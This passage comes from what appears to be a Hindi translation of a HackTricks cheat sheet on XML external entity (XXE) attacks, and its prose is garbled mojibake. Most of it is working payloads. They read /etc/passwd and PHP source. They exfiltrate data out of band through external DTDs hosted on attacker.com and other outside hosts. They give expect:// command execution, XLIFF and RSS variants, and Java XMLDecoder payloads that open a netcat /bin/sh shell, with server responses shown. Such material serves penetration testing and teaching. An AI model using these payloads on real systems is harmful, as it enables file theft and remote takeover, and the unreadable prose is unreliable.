%2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transform to UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### рдлрд╝рд╛рдЗрд▓:/ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдмрд╛рдИрдкрд╛рд╕

рдЕрдЧрд░ рд╡реЗрдм PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ `file:/` рдХреА рдмрдЬрд╛рдп рдЖрдк **php wrappers**`php://filter/convert.base64-encode/resource=` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЖрдВрддрд░рд┐рдХ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЕрдЧрд░ рд╡реЗрдм Java рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк [**jar: рдкреНрд░реЛрдЯреЛрдХреЙрд▓**](xxe-xee-xml-external-entity.md#jar-protocol) рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### HTML Entities

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) рд╕реЗ рдЯреНрд░рд┐рдХ\
рдЖрдк рдПрдХ **рдПрдВрдЯрд┐рдЯреА рдХреЛ рдПрдВрдЯрд┐рдЯреА рдХреЗ рдЕрдВрджрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕реЗ **html entities** рдХреЗ рд╕рд╛рде рдПрдиреНрдХреЛрдб рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ **рдПрдХ dtd рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП **HTML Entities** рдХреЛ **рд╕рдВрдЦреНрдпрд╛рддреНрдордХ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬреИрд╕реЗ \[рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C))ред
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD рдЙрджрд╛рд╣рд░рдг:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP рд░реИрдкрд░реНрд╕

### Base64

**рдирд┐рдХрд╛рд▓реЗрдВ** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрди рдирд┐рдХрд╛рд▓реЗрдВ**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди

**рдпрджрд┐ PHP "expect" рдореЙрдбреНрдпреВрд▓ рд▓реЛрдб рд╣реИ**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

рдпрд╣ рдЦрдВрдб [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
[Wikipedia](https://en.wikipedia.org/wiki/XLIFF) рдХреЗ рдЕрдиреБрд╕рд╛рд░:

> XLIFF (XML Localization Interchange File Format) рдПрдХ XML-рдЖрдзрд╛рд░рд┐рдд рдмрд╛рдЗрдЯреЗрдХреНрд╕реНрдЯ рдкреНрд░рд╛рд░реВрдк рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдпрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рд╕реНрдерд╛рдиреАрдпрдХрд░рдгреАрдп рдбреЗрдЯрд╛ рдХреЛ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рдФрд░ рдореЗрдВ рдкрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдирдХреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ CAT рдЙрдкрдХрд░рдг рд╡рд┐рдирд┐рдордп рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкреНрд░рд╛рд░реВрдк рд╣реИред

### рдЕрдВрдзрд╛ рдЕрдиреБрд░реЛрдз
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ:
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рдмрд░реНрдк рдХреЙрд▓реЗрдмреЛрд░реЗрдЯрд░ рдкрд░ рд╣рд┐рдЯ рдорд┐рд▓рд╛ред

### рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
рдЬреИрд╕рд╛ рдХрд┐ burp collaborator рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд░реНрд╢рд┐рдд User Agent рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓рддреА рд╣реИ, рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ **Java 1.8** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕ рдЬрд╛рд╡рд╛ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ XXE рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╕рдордп рдПрдХ рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ **рд╣рдо `New Line` рдЬреИрд╕реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ `/etc/passwd` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Out of Band рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

### рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛

DTD рдлрд╝рд╛рдЗрд▓:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
рдорд╣рд╛рди! `non-exist` рдлрд╝рд╛рдЗрд▓ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реИред рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реИ рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдордЧреНрд░реА рдЬреЛрдбрд╝рдирд╛ред

DTD рдлрд╝рд╛рдЗрд▓:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╕рд╛рдордЧреНрд░реА рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ **HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЧрдП рддреНрд░реБрдЯрд┐ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**ред

## RSS - XEE

XXE рдЬреЛрдЦрд┐рдо рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП RSS рдкреНрд░рд╛рд░реВрдк рдХреЗ рд╕рд╛рде рдорд╛рдиреНрдп XMLред

### рдкрд┐рдВрдЧ рдмреИрдХ

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдХреЛ рд╕рд░рд▓ HTTP рдЕрдиреБрд░реЛрдзред
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### рд╕реНрд░реЛрдд рдХреЛрдб рдкрдврд╝реЗрдВ

PHP base64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE рд╕реЗ RCE рддрдХ

XMLDecoder рдПрдХ Java рдХреНрд▓рд╛рд╕ рд╣реИ рдЬреЛ рдПрдХ XML рд╕рдВрджреЗрд╢ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдСрдмреНрдЬ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрдорд╛рддрд╛
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## рдЙрдкрдХрд░рдг

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## рдЕрдзрд┐рдХ рд╕рдВрд╕рд╛рдзрди

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
рдЕрдкрдиреЗ рдмрд╛рд╣реНрдп DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗрдВ: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
